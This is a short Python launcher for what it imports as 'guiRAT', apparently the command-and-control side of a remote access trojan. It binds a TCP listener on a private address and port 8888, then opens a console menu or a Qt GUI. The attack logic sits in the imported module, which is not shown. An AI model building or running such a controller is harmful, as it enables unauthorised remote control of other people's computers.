from threading import Thread
from guiRAT import *
import socket


if __name__ == '__main__':
    graphic = False

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('10.94.11.11', 8888))
    server.listen(8)
    thread = Thread(target = start_server, args=([server]))
    thread.start()

    if graphic == False:
        print(logo)
        menu()
    else:
        app = QApplication(sys.argv)
        ex = App()
        sys.exit(app.exec_())
